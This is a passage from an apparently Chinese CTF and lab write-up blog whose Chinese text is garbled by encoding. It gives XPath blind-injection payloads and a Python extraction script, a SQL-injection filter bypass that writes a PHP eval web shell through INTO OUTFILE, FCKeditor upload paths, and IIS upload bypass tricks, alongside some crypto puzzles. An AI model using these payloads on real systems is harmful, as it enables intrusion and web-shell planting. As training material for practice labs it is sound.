class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?u=<span class="string">&#x27; or 1 or &#x27;</span><span class="number">1</span>&amp;p=</span><br><span class="line"><span class="comment">//æ­¤æ—¶æ‰§è¡Œçš„æŸ¥è¯¢</span></span><br><span class="line">$query = <span class="string">&quot;/root/users/user[username/text()=&#x27;&#x27; or 1 or &#x27;1&#x27; and password/text()=&#x27;&#x27;]&quot;</span>;    </span><br></pre></td></tr></table></figure><img src="/2020/04/18/NPUCTF-writeup/TIMæˆªå›¾20200426142520.png" style="zoom:67%;"><h4 id="èŠ‚ç‚¹éå†"><a href="#èŠ‚ç‚¹éå†" class="headerlink" title="èŠ‚ç‚¹éå†"></a>èŠ‚ç‚¹éå†</h4><p>æ„é€ ç±»ä¼¼ä¸‹é¢ï¼Œæ³¨æ„Xpathæ³¨å…¥ä¸åƒsqlæ³¨å…¥ä¸€æ ·æœ‰æ³¨é‡Š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">u=admin<span class="string">&#x27;] | //* | //*[&#x27;</span>&amp;p=</span><br><span class="line"><span class="comment">//æ­¤æ—¶æ‰§è¡Œçš„æŸ¥è¯¢</span></span><br><span class="line">$query = <span class="string">&quot;/root/users/user[username/text()=&#x27;&#x27;] | //* | //*[&#x27;&#x27; and password/text()=&#x27;&#x27;]&quot;</span>;</span><br><span class="line"><span class="comment">//&#x27;]é—­åˆå‰è¾¹çš„ ä¸­é—´ç”¨|è¿æ¥  //*ä»£è¡¨é€‰å–æ–‡æ¡£ä¸­çš„æ‰€æœ‰å…ƒç´   </span></span><br></pre></td></tr></table></figure><img src="/2020/04/18/NPUCTF-writeup/TIMæˆªå›¾20200426150739.png" style="zoom:67%;"><p>è¿™é‡Œçš„<code>|</code>ä¸èƒ½ç”¨orä»£æ›¿</p><h4 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h4><p>ä¸Šé¢çš„æ–¹æ³•æ— æ³•çˆ†å‡ºæ¥flagï¼Œå› ä¸ºphpä¹‹é€‰æ‹©äº†idå’Œpasswordä¸¤ä¸ªèŠ‚ç‚¹</p><p>æˆ‘ä»¬å¯ä»¥ç”¨å¸ƒå°”ç›²æ³¨çš„æ–¹æ³•çˆ†å‡ºæ¥flag</p><p><strong>åˆ¤æ–­èŠ‚ç‚¹æ•°é‡ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?u=<span class="string">&#x27; or count(/)=1 or &#x27;</span><span class="number">1</span>&amp;p=</span><br><span class="line"><span class="comment">//æ­¤æ—¶æ‰§è¡Œçš„æŸ¥è¯¢,æ­£å¸¸è¿”å›è¯´æ˜èŠ‚ç‚¹æ•°é‡æ­£ç¡®</span></span><br><span class="line">$query = <span class="string">&quot;/root/users/user[username/text()=&#x27;&#x27; or count(/)=1 or &#x27;1&#x27; and password/text()=&#x27;&#x27;]&quot;</span>;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä¾æ¬¡éå†ç¬¬äºŒå±‚ã€‚ã€‚ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=<span class="string">&#x27; or count(/*/*)=1 or &#x27;</span><span class="number">1</span>&amp;p=</span><br></pre></td></tr></table></figure><p><strong>è·å–èŠ‚ç‚¹åç§°ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åˆ¤æ–­èŠ‚ç‚¹é•¿åº¦</span></span><br><span class="line">?u=<span class="string">&#x27; or string-length(name(/*[1]))=1 or &#x27;</span><span class="number">1</span>&amp;p=</span><br><span class="line"><span class="comment">//æˆªå–èŠ‚ç‚¹åç§°æ¯”è¾ƒå­—ç¬¦</span></span><br><span class="line">?u=<span class="string">&#x27; or substring(name(/*[1]), 1, 1)=&#x27;</span>a<span class="string">&#x27; or &#x27;</span><span class="number">1</span>&amp;p=</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§è¿™ç§æ€è·¯æˆ‘ä»¬å¯ä»¥æŠŠæ‰€æœ‰èŠ‚ç‚¹è·‘å‡ºæ¥</p><p>å¯¹äºè¿™é“é¢˜ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨è¿™ç§æ€è·¯ï¼Œå…ˆè¯•ä¸‹ä¸‡èƒ½å¯†ç </p><img src="/2020/04/18/NPUCTF-writeup/TIMæˆªå›¾20200426164348.png" style="zoom:67%;"><p>æç¤ºéæ³•æ“ä½œè¯´æ˜æˆåŠŸå¸¦å…¥äº†ï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://9c306d79-3e0b-4b84-8711-dcfe1d3dc1b4.node3.buuoj.cn/login.php&#x27;</span></span><br><span class="line">s=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz1234567890&#123;-*#$@()+^?/&lt;&gt;|~&#125;&#x27;</span></span><br><span class="line">data=<span class="string">&quot;&lt;username&gt;&#x27; or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;1&lt;/username&gt;&lt;password&gt;a&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span></span><br><span class="line">proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># def get_token():</span></span><br><span class="line"><span class="comment">#     ran=random.randint(1,100000000000000)</span></span><br><span class="line"><span class="comment">#     headers=&#123;</span></span><br><span class="line"><span class="comment">#         &quot;Cookie&quot;:&quot;PHPSESSID=&#123;&#125;&quot;.format(str(ran))</span></span><br><span class="line"><span class="comment">#     &#125;</span></span><br><span class="line"><span class="comment">#     r1=requests.get(url,headers=headers,proxies=proxies)</span></span><br><span class="line"><span class="comment">#     token=re.search(r&#x27;\&lt;input type=\&quot;hidden\&quot; id=\&quot;token\&quot; value=\&quot;(.*)\&quot; \/\&gt;&#x27;,r1.text).group(1)</span></span><br><span class="line"><span class="comment">#     return ran,token</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    flag1=flag</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        sess=requests.session()</span><br><span class="line">        <span class="comment"># ran,token=get_token()</span></span><br><span class="line">        r1=sess.get(url,proxies=proxies)</span><br><span class="line">        token=re.search(<span class="string">r&#x27;\&lt;input type=\&quot;hidden\&quot; id=\&quot;token\&quot; value=\&quot;(.*)\&quot; \/\&gt;&#x27;</span>,r1.text).group(<span class="number">1</span>)</span><br><span class="line">        headers=&#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/xml&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r2=sess.post(url,data=data.format(str(i),j,token),headers=headers,proxies=proxies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;éæ³•æ“ä½œ&#x27;</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(j)</span><br><span class="line">    <span class="keyword">if</span> flag1==flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>è·‘å‡ºå¦‚ä¸‹æ ¼å¼çš„èŠ‚ç‚¹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">accounts</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">accounts</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬ç”¨</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>&#x27; or substring(/root/accounts/user/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;1<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;<span class="name">token</span>&gt;</span>&#123;&#125;<span class="tag">&lt;/<span class="name">token</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è·‘å‡ºç¬¬ä¸€ä¸ªï¼Œå‘ç°ç™»é™†ä¸Šå»å•¥éƒ½æ²¡æœ‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=guest</span><br><span class="line">password=e10adc3949ba59abbe56e057f20f883e  MD5è§£å¯†<span class="number">123456</span></span><br></pre></td></tr></table></figure><p>å†è·‘ç¬¬äºŒä¸ª</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=adm1n</span><br><span class="line">password=cf7414b5bdb2e65ee43083f4ddbc4d9f   MD5è§£å¯†gtfly123</span><br></pre></td></tr></table></figure><p>æ¥ç€å°±æ˜¯php://filterè¯»æ–‡ä»¶,è¿‡æ»¤äº†php,read,base,å¤§å†™ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin.php?file=PHP:<span class="comment">//filter/rEad=convert.basE64-encode/resource=/flag</span></span><br></pre></td></tr></table></figure><p>å­¦é•¿å‡ºçš„é¢˜å¤ªé¡¶äº†ï¼Œè†œæ‹œï¼ï¼ï¼</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="è¿™æ˜¯ä»€ä¹ˆå¯†ç "><a href="#è¿™æ˜¯ä»€ä¹ˆå¯†ç " class="headerlink" title="è¿™æ˜¯ä»€ä¹ˆå¯†ç "></a>è¿™æ˜¯ä»€ä¹ˆå¯†ç </h3><p>é¢˜ç›®ï¼š</p><img src="/2020/04/18/NPUCTF-writeup/flag.jpg" style="zoom: 33%;"><p>æœäº†æœï¼Œæœåˆ°äº†ä¸ªæ—¥å†å¯†ç </p><p>Fä»£è¡¨å‘¨äº” S1ä»£è¡¨å‘¨å…­ S2ä»£è¡¨å‘¨æ—¥ åé¢æ˜¯ç¬¬å‡ ä¸ªå‘¨*  å¯¹åº”å­—æ¯è¡¨å°±è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">F1 W1 S22 S21 T12 S11 W1 S13</span><br><span class="line"><span class="number">3</span> <span class="number">1</span> <span class="number">12</span> <span class="number">5</span> <span class="number">14</span> <span class="number">4</span> <span class="number">1</span> <span class="number">18</span></span><br><span class="line">calendar</span><br><span class="line">flag&#123;calendar&#125;</span><br></pre></td></tr></table></figure><h3 id="Classical-Cipher"><a href="#Classical-Cipher" class="headerlink" title="Classical_Cipher"></a>Classical_Cipher</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å‹ç¼©åŒ…å¯†ç ï¼šgsv_pvb_rh_zgyzhs</span><br><span class="line"></span><br><span class="line">å¯¹åº”æ˜æ–‡ï¼š   ***_key_**_******</span><br></pre></td></tr></table></figure><p>å†™äº†ä¸ªexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> zip(<span class="string">&quot;pvb&quot;</span>,<span class="string">&quot;key&quot;</span>):</span><br><span class="line">print(ord(i)+ord(j))</span><br><span class="line">key=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;gsv_pvb_rh_zgyzhs&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> i!=<span class="string">&quot;_&quot;</span>:</span><br><span class="line">key=key+chr(<span class="number">219</span>-ord(i))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">key=key+<span class="string">&quot;_&quot;</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>å…¶å®è¿™ä¸ªæ˜¯åŸƒç‰¹å·´ä»€å¯†ç </p><p>è§£å‹ä¹‹åï¼Œä¸€å¼ å›¾ï¼Œåšå¤šäº†å°±çŸ¥é“æ˜¯çŒªåœˆå˜ç§å¯†ç å’ŒåŸƒåŠè±¡å½¢æ–‡å­—ï¼Œè´´ä¸€ä¸‹å›¾ï¼š</p><img src="/2020/04/18/NPUCTF-writeup/flag.png" style="zoom: 67%;"><p>åŸƒåŠè±¡å½¢æ–‡å­—ï¼š</p><img src="/2020/04/18/NPUCTF-writeup/pngkit_hieroglyphics-png_2131062.png" style="zoom:80%;"><p>çŒªåœˆå¯†ç ï¼š</p><img src="/2020/04/18/NPUCTF-writeup/eba2d7ca7bcb0a46d9ed92316d63f6246a60afb8.jpg" style="zoom: 67%;"><img src="/2020/04/18/NPUCTF-writeup/9c9a0a46f21fbe094691da1c6d600c338644adb8.jpg" style="zoom:67%;"><p>æ‰€ä»¥è§£å‡ºæ¥å°±æ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;classicalcode&#125;</span><br></pre></td></tr></table></figure><h3 id="Mersenne-twister"><a href="#Mersenne-twister" class="headerlink" title="Mersenne_twister"></a>Mersenne_twister</h3>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> NPUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¢¨è€…å­¦é™¢é¢˜ç›®writeup</title>
      <link href="2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/"/>
      <url>2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘360ä¼—æµ‹å¾ˆç«ï¼Œå¬è¯´å¥½å¤šè¿™ä¸Šé¢çš„é¢˜ï¼ŒæŠ½ç©ºåšåšï¼</p><a id="more"></a><h2 id="Webå®‰å…¨"><a href="#Webå®‰å…¨" class="headerlink" title="Webå®‰å…¨"></a>Webå®‰å…¨</h2><h3 id="CMSæ¼æ´"><a href="#CMSæ¼æ´" class="headerlink" title="CMSæ¼æ´"></a>CMSæ¼æ´</h3><h4 id="BeesCMSç³»ç»Ÿæ¼æ´åˆ†ææº¯æº"><a href="#BeesCMSç³»ç»Ÿæ¼æ´åˆ†ææº¯æº" class="headerlink" title="BeesCMSç³»ç»Ÿæ¼æ´åˆ†ææº¯æº"></a>BeesCMSç³»ç»Ÿæ¼æ´åˆ†ææº¯æº</h4><p>å¾¡å‰‘æ‰«ç›®å½•ï¼š</p><img src="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/TIMæˆªå›¾20200413211443.png" style="zoom: 80%;"><p>å‘ç°åå°<code>/admin/login.php</code>ï¼Œæ­¤å¤„å­˜åœ¨sqlæ³¨å…¥</p><p>è¯¦ç»†åˆ†æå‚è§ï¼š<a href="https://www.cnblogs.com/yuzly/p/11423384.html">https://www.cnblogs.com/yuzly/p/11423384.html</a></p><p>æ­¤å¤„éªŒè¯ç å­˜åœ¨æ¼æ´ï¼Œå³ä¸€ä¸ªéªŒè¯ç å¯å¤šæ¬¡ä½¿ç”¨ï¼Œæˆ‘ä»¬åœ¨usernameå¤„åŠ ä¸Šä¸€ä¸ª<code>&#39;</code>å‘ç°</p><img src="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/TIMæˆªå›¾20200413211954.png" style="zoom:80%;"><p>sqlè¯­å¥ä¹Ÿå‡ºæ¥äº†</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,admin_name,admin_password,admin_purview,is_disable <span class="keyword">from</span> bees_admin <span class="keyword">where</span> admin_name=<span class="string">&#x27;dsad&#x27;&#x27; limit 0,1</span></span><br></pre></td></tr></table></figure><p>æ¼æ´åˆ†æå¯çŸ¥ï¼Œunion, and,selectè¢«æ›¿æ¢ï¼Œå¯ä»¥è¿™æ ·ç»•è¿‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union =&gt; uni union on</span><br><span class="line">select =&gt; selselectect</span><br><span class="line"><span class="keyword">and</span> =&gt; a <span class="keyword">and</span> nd</span><br></pre></td></tr></table></figure><p>userè¾“å…¥,å‘ç°æˆåŠŸæŠ¥é”™æ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin &#x27; a and nd extractvalue(1,concat(1,database()))%23</span><br></pre></td></tr></table></figure><p>è¯•ç€å†™shellï¼Œè¿™é‡Œæœ‰htmlspecialcharså‡½æ•°çš„è¿‡æ»¤ï¼Œ16è¿›åˆ¶æˆ–è€…charå‡½æ•°ç»•è¿‡ï¼Œurlç¼–ç å¥½åƒç»•è¿‡ä¸äº†ï¼Œè¿˜æœ‰å¯¹into ,outfileçš„è¿‡æ»¤ï¼Œå¯ä»¥è¿™æ ·ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">outfile =&gt; outoutfilefile</span><br><span class="line">into =&gt; in into</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ„é€ payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; uni union on selselectect 1,2,3,4,0x3c3f70687020406576616c28245f504f53545b315d293b3f3e  in into  outoutfilefile %27/var/www/html/moonback.php%27%23</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; uni union on selselectect null,null,null,null,CHAR(60, 63, 112, 104, 112, 32, 64, 101, 118, 97, 108, 40, 36, 95, 80, 79, 83, 84, 91, 49, 93, 41, 59, 63, 62)  in into  outoutfilefile %27/var/www/html/mb.php%27%23</span></span><br></pre></td></tr></table></figure><p>å¯†ç ä¸º1ï¼Œèšå‰‘è¿åœ¨<code>/key.txt</code>å‘ç°key</p><img src="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/TIMæˆªå›¾20200413215317.png" style="zoom:80%;"><h3 id="ç¼–è¾‘å™¨æ¼æ´"><a href="#ç¼–è¾‘å™¨æ¼æ´" class="headerlink" title="ç¼–è¾‘å™¨æ¼æ´"></a>ç¼–è¾‘å™¨æ¼æ´</h3><h4 id="ç¼–è¾‘å™¨æ¼æ´åˆ†ææº¯æº-ç¬¬1é¢˜"><a href="#ç¼–è¾‘å™¨æ¼æ´åˆ†ææº¯æº-ç¬¬1é¢˜" class="headerlink" title="ç¼–è¾‘å™¨æ¼æ´åˆ†ææº¯æº(ç¬¬1é¢˜)"></a>ç¼–è¾‘å™¨æ¼æ´åˆ†ææº¯æº(ç¬¬1é¢˜)</h4><p>å‚è€ƒ:<a href="https://www.secpulse.com/archives/116338.html">https://www.secpulse.com/archives/116338.html</a></p><p>è®¿é—®é¶åœºï¼Œæç¤ºç¼–è¾‘å™¨åœ¨<code>/fckeditor/</code>ç›®å½•</p><p>æŸ¥çœ‹ä¸€ä¸‹ç¼–è¾‘å™¨ç‰ˆæœ¬ä¿¡æ¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/fckeditor/editor/dialog/fck_about.html</span><br><span class="line">/FCKeditor/_whatsnew.html</span><br></pre></td></tr></table></figure><img src="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/TIMæˆªå›¾20200413221018.png" style="zoom: 67%;"><p>æµ‹è¯•ä¸Šä¼ ç‚¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/connectors/test.html</span><br><span class="line">FCKeditor/editor/filemanager/upload/test.html</span><br><span class="line">FCKeditor/editor/filemanager/connectors/test.html</span><br><span class="line">FCKeditor/editor/filemanager/connectors/uploadtest.html</span><br><span class="line"></span><br><span class="line">FCKeditor/_samples/<span class="keyword">default</span>.html</span><br><span class="line">FCKeditor/_samples/asp/sample01.asp</span><br><span class="line">FCKeditor/_samples/asp/sample02.asp</span><br><span class="line">FCKeditor/_samples/asp/sample03.asp</span><br><span class="line">FCKeditor/_samples/asp/sample04.asp</span><br><span class="line">FCKeditor/_samples/<span class="keyword">default</span>.html</span><br><span class="line">FCKeditor/editor/fckeditor.htm</span><br><span class="line">FCKeditor/editor/fckdialog.html</span><br><span class="line"></span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/connectors/php/connector.php?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=http:<span class="comment">//www.site.com/fckeditor/editor/filemanager/connectors/php/connector.php</span></span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=http:<span class="comment">//www.site.com/fckeditor/editor/filemanager/connectors/asp/connector.asp</span></span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=http:<span class="comment">//www.site.com/fckeditor/editor/filemanager/connectors/aspx/connector.aspx</span></span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=http:<span class="comment">//www.site.com/fckeditor/editor/filemanager/connectors/jsp/connector.jsp</span></span><br><span class="line"></span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?type=Image&amp;connector=connectors/asp/connector.asp</span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=connectors/jsp/connector.jsp</span><br><span class="line">fckeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=connectors/aspx/connector.Aspx</span><br><span class="line">fckeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=connectors/php/connector.php</span><br></pre></td></tr></table></figure><p>éšä¾¿è¾“ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„å‘ç°æ˜¯IISçš„æŠ¥é”™é¡µé¢ï¼Œåœ¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fckeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;test.html</span><br></pre></td></tr></table></figure><p>å‘ç°å¯ä»¥ä¸Šä¼ </p><img src="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/TIMæˆªå›¾20200413224820.png" style="zoom:67%;"><p>åœ¨http å“åº”å¤´é‡Œçœ‹åˆ°æœ‰<code>Microsoft-IIS/6.0</code>ï¼Œç»•è¿‡æ–¹æ³•å¾ˆå¤šï¼Œè¿™é‡Œä¸éœ€è¦ç»•è¿‡å¥½åƒ</p><p><strong>1. äºŒæ¬¡ä¸Šä¼ ç»•è¿‡</strong></p><p>æ–‡ä»¶åâ€˜ . â€™ ä¿®æ”¹ä¸ºâ€˜ _ â€™</p><p>FCKåœ¨ä¸Šä¼ äº†è¯¸å¦‚<code>shell.asp;.jpg</code>çš„æ–‡ä»¶åï¼Œä¼šè‡ªåŠ¨å°†æ–‡ä»¶åæ”¹ä¸º<code>shell_asp;.jpg</code>ã€‚å¯ä»¥ç»§ç»­ä¸Šä¼ åŒåæ–‡ä»¶ï¼Œæ–‡ä»¶åä¼šå˜ä¸º<code>shell.asp;(1).jpg</code></p><p><strong>2. æäº¤shell.php+ç©ºæ ¼ç»•è¿‡</strong></p><p>æäº¤<code>shell.php</code>+ç©ºæ ¼ç»•è¿‡</p><p>ç©ºæ ¼åªæ”¯æŒwindowsç³»ç»Ÿï¼Œlinuxç³»ç»Ÿæ˜¯ä¸æ”¯æŒçš„ï¼Œå¯æäº¤<code>shell.php</code>+ç©ºæ ¼æ¥ç»•è¿‡æ–‡ä»¶åé™åˆ¶ã€‚</p><p><strong>3. iis6.0çªç ´æ–‡ä»¶å¤¹é™åˆ¶</strong></p><figure class="highlight plain"><table><tr><td 